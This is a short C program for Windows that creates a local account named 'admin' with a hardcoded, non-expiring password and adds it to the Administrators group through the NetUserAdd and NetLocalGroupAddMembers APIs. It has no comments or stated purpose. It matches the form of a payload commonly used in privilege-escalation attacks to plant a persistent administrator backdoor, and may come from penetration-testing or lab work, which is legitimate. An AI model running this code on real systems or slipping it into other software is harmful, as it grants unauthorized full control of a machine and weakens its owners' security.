#include <windows.h>
#include <LM.h>
#pragma comment(lib, "netapi32.lib")

int wmain()
{

	wchar_t username[] = L"admin";
	wchar_t password[] = L"P@ssw0rd1!@#$";
	wchar_t group[] = L"Administrators";
	USER_INFO_1 userinfo;
	memset(&userinfo, 0, sizeof(USER_INFO_1));
	userinfo.usri1_name = username;
	userinfo.usri1_password = password;
	userinfo.usri1_priv = USER_PRIV_USER;
	userinfo.usri1_flags = UF_DONT_EXPIRE_PASSWD;
	NetUserAdd(NULL, 1, (LPBYTE)&userinfo, NULL);


	LOCALGROUP_MEMBERS_INFO_3 members;
	members.lgrmi3_domainandname = username;
	NetLocalGroupAddMembers(NULL, group, 3, (LPBYTE)&members, 1);


}


